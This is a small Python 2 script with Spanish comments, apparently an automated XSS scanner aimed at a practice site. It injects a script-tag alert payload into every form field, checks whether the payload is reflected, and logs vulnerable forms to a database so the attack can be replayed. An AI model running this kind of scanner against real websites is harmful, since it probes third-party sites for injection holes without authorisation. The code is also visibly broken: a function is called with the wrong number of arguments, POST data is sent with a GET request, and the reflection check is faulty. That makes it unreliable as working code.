import sys
import requests
import bs4
import dataset
import threading


class Database:

    def __init__(self, domain):
        self.database_table = domain 
        

    def escribir(self, url, form_names, metodo):
        with dataset.connect('sqlite:///xss-encontrados.db') as xss_db:
            # Comprimamos todos los names en uno solo para tener
            # una referencia a la hora que queramos replicar el ataque
            names = form_names.pop()
            for name in form_names:
                names= names+'-'+name

            xss_data = dict(url=url, names=names, metodo=metodo)
            xss_db[self.database_table].insert(xss_data)


def checkearPOST(url, names, codigo_malicioso):
    form_data= {}

    # Armamos el form 
    # aca cargar previamente los payloads maliciosos
    for name in names:
        form_data[name] = '<script>alert("XssPrueba")</script>'

    res = requests.get(url, data=form_data)
    res.raise_for_status()
    print "Ya envie la request"

    # Buscamos si es vulnerable.
    es_vulnerable = False
    soup = bs4.BeautifulSoup(res.text,"html.parser")
    try: 
        scripts = soup.select('script')
        for script in scripts:
            if 'alert("XssPrueba")' in script:
                es_vulnerable = True
        return es_vulnerable            
    except:

        return es_vulnerable


def checkearGET(url, names):
    form_data= {}
    # aca cargar previamente los payloads maliciosos
    for name in names:
        form_data[name] = '<script>alert("XssPrueba")</script>'

    res = requests.get(url, params=form_data)
    res.raise_for_status()
    print "Ya envie la request"

    # Buscamos si es vulnerable.
    es_vulnerable = False
    soup = bs4.BeautifulSoup(res.text,"html.parser")
    try: 
        scripts = soup.select('script')
        for script in scripts:
            if 'alert("XssPrueba")' in script:
                es_vulnerable = True
        return es_vulnerable
                    
    except:

        return es_vulnerable


def checkearXSS(url,database,lock):
    res = requests.get(url)
    res.raise_for_status()
    soup = bs4.BeautifulSoup(res.text,"html.parser")
    forms = soup.select('form')
    for form in forms:
        metodo = form.get('method')
        if metodo == "GET":

            inputs = form.select('input')
            names = []
            for inpt in inputs:
                name = inpt.get('name')
                if name != None:
                    names.append(name)
            if checkearGET(url,names):
                lock.acquire()
                database.escribir(url,names,metodo)
                lock.release()


        elif metodo == "POST":

            inputs = form.select('input')
            names = []
            for inpt in inputs:
                name = inpt.get('name')
                if name != None:
                    names.append(name)
            if checkearPOST(url,names):
                lock.acquire()
                database.escribir(url,names,metodo)
                lock.release()


lock = threading.Lock()
database = Database('xss-game')
url = "http://xss-game.appspot.com/level1/frame?"
checkearXSS(url,database,lock)
print "Ya la chequie"